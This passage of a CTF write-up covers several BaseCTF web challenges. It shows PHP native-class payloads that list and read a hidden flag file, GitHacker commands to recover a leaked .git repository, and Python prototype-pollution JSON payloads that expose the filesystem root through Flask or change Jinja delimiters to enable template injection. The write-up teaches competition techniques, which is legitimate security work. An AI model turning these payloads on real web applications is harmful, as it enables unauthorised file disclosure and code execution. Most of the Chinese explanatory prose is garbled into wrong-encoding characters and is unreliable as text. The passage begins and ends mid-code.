number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="flagÁõ¥Êé•ËØªÂèñ‰∏çÂ∞±Ë°å‰∫ÜÔºü-phpÂéüÁîüÁ±ª"><a href="#flagÁõ¥Êé•ËØªÂèñ‰∏çÂ∞±Ë°å‰∫ÜÔºü-phpÂéüÁîüÁ±ª" class="headerlink" title="flagÁõ¥Êé•ËØªÂèñ‰∏çÂ∞±Ë°å‰∫ÜÔºü(phpÂéüÁîüÁ±ª)"></a>flagÁõ¥Êé•ËØªÂèñ‰∏çÂ∞±Ë°å‰∫ÜÔºü(phpÂéüÁîüÁ±ª)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># ÊàëÊääflagËóèÂú®‰∏Ä‰∏™secretÊñá‰ª∂Â§πÈáåÈù¢‰∫ÜÔºåÊâÄ‰ª•Ë¶ÅÂ≠¶‰ºöÈÅçÂéÜÂïä~</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">?K=DirectoryIterator&amp;W=/secret/?K=SplFileObject&amp;W=/secret/f11444g.php</code></pre><p><a href="https://www.anquanke.com/post/id/238482#h3-22">PHP ÂéüÁîüÁ±ªÂú® CTF ‰∏≠ÁöÑÂà©Áî®</a></p><h4 id="Back-to-the-future-gitÊ≥ÑÈú≤"><a href="#Back-to-the-future-gitÊ≥ÑÈú≤" class="headerlink" title="Back to the future(gitÊ≥ÑÈú≤)"></a>Back to the future(gitÊ≥ÑÈú≤)</h4><p>Êé®Ëçê‰ΩøÁî®<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>Âà©Áî®Â∑•ÂÖ∑ÊääËøô‰∏™È°πÁõÆÊãâ‰∏ãÊù•</p><pre class="language-bash" data-language="bash"><code class="language-bash">githacker <span class="token parameter variable">--url</span> http://challenge.basectf.fun:49240/ <span class="token parameter variable">--output</span> back-future</code></pre><p>‰ΩøÁî®<code>git log</code>Êü•ÁúãÊèê‰∫§ËÆ∞ÂΩï</p><p><img src="git.png" loading="lazy"></p><p>ÂèØ‰ª•ÁúãÂà∞ <code>9d85f10e0192ef630e10d7f876a117db41c30417</code> Ëøô‰∏™Êèê‰∫§, Êàë‰ª¨ÂèØ‰ª•ÂàáÂà∞ÈÇ£‰∏ÄÊ¨°Êèê‰∫§</p><p><strong>ÂàáÊç¢Âà∞ÁâπÂÆöÊèê‰∫§Ôºö</strong></p><p>‰Ω†ÂèØ‰ª•‰ΩøÁî®Êèê‰∫§ÁöÑÂìàÂ∏åÂÄº <strong><commit-hash></commit-hash></strong> Êù•ÂàáÊç¢Âà∞ÁâπÂÆöÁöÑÊèê‰∫§Áä∂ÊÄÅ„ÄÇËøôÂ∞Ü‰Ωø‰Ω†ËøõÂÖ•‚ÄùÂàÜÁ¶ªÂ§¥ÊåáÈíà‚ÄùÁä∂ÊÄÅÔºåÂè™ËÉΩÊü•ÁúãÂéÜÂè≤ËÆ∞ÂΩïÔºåËÄå‰∏çËÉΩËøõË°åÂàÜÊîØÊìç‰Ωú„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºå‰∏çÂª∫ËÆÆÂú®ÂàÜÁ¶ªÂ§¥ÊåáÈíàÁä∂ÊÄÅ‰∏ãÂ∑•‰ΩúÔºåÂõ†‰∏∫Êõ¥ÊîπÂèØËÉΩ‰ºö‰∏¢Â§±„ÄÇ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 9d85f10e0192ef630e10d7f876a117db41c30417</code></pre><p>ÊàñËÄÖ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog</code></pre><p><img src="git_2.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 9d85f10</code></pre><h4 id="Âú£Èí•‰πãÊàò1-0-python-ÂéüÂûãÈìæÊ±°Êüì"><a href="#Âú£Èí•‰πãÊàò1-0-python-ÂéüÂûãÈìæÊ±°Êüì" class="headerlink" title="Âú£Èí•‰πãÊàò1.0(python ÂéüÂûãÈìæÊ±°Êüì)"></a>Âú£Èí•‰πãÊàò1.0(python ÂéüÂûãÈìæÊ±°Êüì)</h4><p>&#x2F;read</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f"J1ngHongËØ¥Ôºö‰Ω†ÊÉ≥read flagÂêóÔºüÈÇ£‰πàÂú£Èí•‰πãÂÖâÂøÖÂ∞ÜÈòªÊ≠¢‰Ω†ÔºÅ‰ΩÜÊòØÂ∞èÂ∞èÁöÑÊ∫êÁ†ÅÊ≤°‰∫ãÔºåÂõ†‰∏∫‰Ω†‰πüËØª‰∏çÂà∞flag<span class="token punctuation">(</span>‰πê<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>"<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"J1ngHongËØ¥ÔºöÈí•ÂåôÂú£Ê¥ÅÊó†ÊöáÔºåÊó†‰∫∫ÂèØ‰ª•Ê±°ÊüìÔºÅ"</span>    <span class="token keyword">return</span> <span class="token string">"J1ngHongËØ¥ÔºöÂú£Èí•ÊöóÊ∑°‰∫Ü‰∏ÄÁÇπÔºå‰Ω†Â±ÖÁÑ∂Ê±°ÊüìÊàêÂäü‰∫ÜÔºü"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>ÁúãÂà∞index.htmlÊ∫êÁ†ÅÊúâÂº†ÂõæÁâá</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>J1ngHong's Message<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>J1ngHongËØ¥ÔºöËøôÊòØÂú£Èí•ÔºåÁ∫ØÂáÄÊó†ÊöáÔºå‰∏çËÉΩÊ±°ÊüìÔºå‰ΩÜÊòØ‰Ω†ÂèØ‰ª•ÂéªreadÈÇ£ÈáåÊâæ‰∏Ä‰∏ãflag~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/1.jpeg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.jpeg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Ê≠§Êó∂<code>http://domain/static/xxx</code>Âè™ËÉΩËÆøÈóÆÂà∞Êñá‰ª∂Á≥ªÁªüÂΩìÂâçÁõÆÂΩï‰∏ã<code>static</code>ÁõÆÂΩï‰∏≠ÁöÑ<code>xxx</code>Êñá‰ª∂ÔºåÂπ∂‰∏î‰∏çÂ≠òÂú®Â¶ÇÁõÆÂΩïÁ©øË∂äÁöÑÊºèÊ¥û</p><p>Ê±°ÊüìËØ•Â±ûÊÄß‰∏∫ÂΩìÊ†πÁõÆÂΩï„ÄÇËøôÊ†∑Â∞±ËÉΩËÆøÈóÆÂà∞Ê†πÁõÆÂΩï‰∏ãÁöÑ<code>flag</code>Êñá‰ª∂‰∫Ü</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/pollute</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:27598</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">59</span></span><span class="token application-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÂÆòÊñπwp</p><p>Áõ¥Êé•Ëøõ&#x2F;readÁúãÊ∫êÁ†ÅÔºåÁÑ∂ÂêéËøõ&#x2F;flagËøõË°åpostÊñπÊ≥ï‰º†ÂèÇ‰∏Ä‰∏™jsonÁöÑpayloadÔºö</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__file__"</span><span class="token operator">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÁÑ∂ÂêéÂéª&#x2F;readÂ∞±Êúâflag‰∫Ü„ÄÇ</p><p><a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">PythonÂéüÂûãÈìæÊ±°ÊüìÂèò‰Ωì</a></p><p><a href="https://xz.aliyun.com/t/14620?u_atoken=65ddecfdc7f9515861cf73192c653805&u_asession=01tg4Re7x0Sqx3A9faMOrup1F3mTWuKaW_b83fFDALPOQjbSlByuTWDvmso5UJrutRJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05KUap-1IvBgPL8vv3yGCEzc48Q3oSFVi6MzLmEIrnKCHNj-TcUYd0qEjBQBggpCmBY4-dXw-Dff-QxyIWhBRxKivSQQy06u45IR3F7Ej5igWbWdYp_mc4TBTzDPCYHzJJHdqLK01P4bnw7O9Ygq_e03flitwL3Wj5Od6rPKqtngzBzhvSc0Kr8URjOX9Xe4tkTrTE5w3F08xyE75_wBFoikKIg66WHK8pgCdoRnyOQXTt782cQmBlQQJQ9IDcYv2cGsWAe-e_PYvPamjVaebg-CAqscTuE4GHrj-VNCf8HPd6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=8PtQL6DjIKQRdT5m/qOLtcLvayM=">‰ªéCISCN2024ÁöÑsanicÂºïÂèëÂØπpython‚ÄúÂéüÂûãÈìæ‚ÄùÁöÑÊ±°ÊüìÊåñÊéò</a></p><p><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIeAK37KG=22BDRgibD#toc-6">ÊµÖË∞àPythonÂéüÂûãÈìæÊ±°ÊüìÂèäÂà©Áî®ÊñπÂºè</a></p><h4 id="Jinja-Mark-ÂéüÂûãÈìæÊ±°Êüì-ssti"><a href="#Jinja-Mark-ÂéüÂûãÈìæÊ±°Êüì-ssti" class="headerlink" title="Jinja Mark(ÂéüÂûãÈìæÊ±°Êüì+ssti)"></a>Jinja Mark(ÂéüÂûãÈìæÊ±°Êüì+ssti)</h4><p>ËÆøÈóÆindexÁõÆÂΩï ÊòØ‰∏Ä‰∏™ËøáÊª§‰∫ÜËä±Êã¨Âè∑ÁöÑsstiÊ≥®ÂÖ• ‰∏çËøáÊµãËØï49 ÂæóÂà∞hint magicÁõÆÂΩï Ë¶ÅÊ±Ç‰º†ÂÖ•json</p><p>ËÆøÈóÆflagÁõÆÂΩï ÂæóÂà∞hint</p><pre class="language-php" data-language="php"><code class="language-php">‰Ω†‰∏ç‰ºö‰ª•‰∏∫ËøôÈáåÁúüÁöÑÊúâflagÂêßÔºüÊÉ≥Ë¶ÅflagÁöÑËØùÂÖàÁåúÁåúÊàëÁöÑÂπ∏ËøêÊï∞Â≠óÁî®<span class="token constant">POST</span>ÊñπÂºèÊää lucky_number ÂëäËØâÊàëÂêßÔºåÂè™ÊúâÂõõ‰ΩçÊï∞Âì¶</code></pre><p>ÁåúÂá∫Âπ∏ËøêÊï∞Â≠óËøîÂõû‰∫Ü magicÁöÑÊ∫êÁ†Å pythonÂéüÂûãÈìæÊ±°Êüì</p><pre class="language-python" data-language="python"><code class="language-python">BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/magic'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Ëøô‰∏™È≠îÊúØËøòË°åÂêß"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ÊàëË¶ÅjsonÁöÑÈ≠îÊúØ"</span>    <span class="token keyword">return</span> <span class="token string">"ËÆ∞ÂæóÁî®POSTÊñπÊ≥ïÊääÈ≠îÊúØ‰∫§‰∏äÊù•"</span></code></pre><p>ËøôÈáåÂØπÂ∫îÁöÑmergeÂáΩÊï∞Â∞±ÊòØpython‰∏≠ÂØπÂ±ûÊÄßÂÄºÊéßÂà∂ÁöÑ‰∏Ä‰∏™Êìç‰ΩúÔºåÊàë‰ª¨Êù•ÁÆÄÂçïÁöÑËß£Èáä‰∏Ä‰∏ãÔºömerge‰∏≠Êàë‰ª¨ÁªìÂêànodejsÁöÑmergeÊù•ÁêÜËß£ÔºåÂ∞±ÊòØÂ∞ÜÊ∫êÂèÇÊï∞ËµãÂÄºÂà∞ÁõÆÊ†áÂèÇÊï∞„ÄÇ</p><p>ÁÑ∂ÂêéÂØπsrc‰∏≠ÁöÑÈîÆÂÄºÂØπËøõË°å‰∫ÜÈÅçÂéÜÔºåÁÑ∂ÂêéÊ£ÄÊü•dst‰∏≠ÊòØÂê¶Âê´Êúâ<code>__getitem__</code>Â±ûÊÄßÔºå‰ª•Ê≠§Êù•Âà§Êñ≠dstÊòØÂê¶‰∏∫Â≠óÂÖ∏„ÄÇÂ¶ÇÊûúÂ≠òÂú®ÁöÑËØùÔºåÊ£ÄÊµãdst‰∏≠ÊòØÂê¶Â≠òÂú®Â±ûÊÄßk‰∏îvalueÊòØÂê¶ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÔºåÂ∞±ÁªßÁª≠ÂµåÂ•ómergeÂØπÂÜÖÈÉ®ÁöÑÂ≠óÂÖ∏ÂÜçËøõË°åÈÅçÂéÜÔºåÂ∞ÜÂØπÂ∫îÁöÑÊØè‰∏™ÈîÆÂÄºÂØπÈÉΩÂèñÂá∫Êù•„ÄÇÂ¶ÇÊûú‰∏çÂ≠òÂú®ÁöÑËØùÂ∞±Â∞Üsrc‰∏≠ÁöÑvalueÁöÑÂÄºËµãÂÄºÁªôdstÂØπÂ∫îÁöÑkeyÁöÑÂÄº„ÄÇ</p><p>Â¶ÇÊûúdst‰∏çÂê´ÊúâgetitemÂ±ûÊÄßÁöÑËØùÔºåÈÇ£Â∞±ËØ¥Êòédst‰∏çÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÂ∞±Áõ¥Êé•Ê£ÄÊµãdst‰∏≠ÊòØÂê¶Â≠òÂú®kÁöÑÂ±ûÊÄßÔºåÂπ∂Ê£ÄÊµãËØ•Â±ûÊÄßÂÄºÊòØÂê¶‰∏∫Â≠óÂÖ∏ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÂ∞±ÂÜçÈÄöËøámergeÂáΩÊï∞ËøõË°åÈÅçÂéÜÔºåÂ∞Ük‰Ωú‰∏∫dstÔºåv‰Ωú‰∏∫srcÔºåÁªßÁª≠ÂèñÂá∫vÈáåÈù¢ÁöÑÈîÆÂÄºÂØπËøõË°åÈÅçÂéÜ„ÄÇ</p><p><strong>ÊâÄ‰ª•Âú®&#x2F;magicË∑ØÁî±‰∏ãÊ±°ÊüìjinjaÁöÑËØ≠Ê≥ïÊ†áËØÜÁ¨¶ÔºåÂ∞Ü‚Äù,‚Äú‰øÆÊîπ‰∏∫‚Äù&lt;&lt;‚Äù,‚Äù&gt;&gt;‚ÄùÊàñËÄÖÂÖ∂‰ªñ‰∏çÂΩ±ÂìçsstiÊ≥®ÂÖ•ÁöÑÁ¨¶Âè∑ÔºåÂÖ∑‰ΩìÂÜÖÂÆπÂ¶Ç‰∏ãÔºå‰º†ÂÖ•ÂêéÂéª&#x2F;indexËøõË°åÊó†ËøáÊª§ÁöÑsstiÊ≥®ÂÖ•Âç≥ÂèØ</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"&lt;&lt;"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">">>"</span><span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span 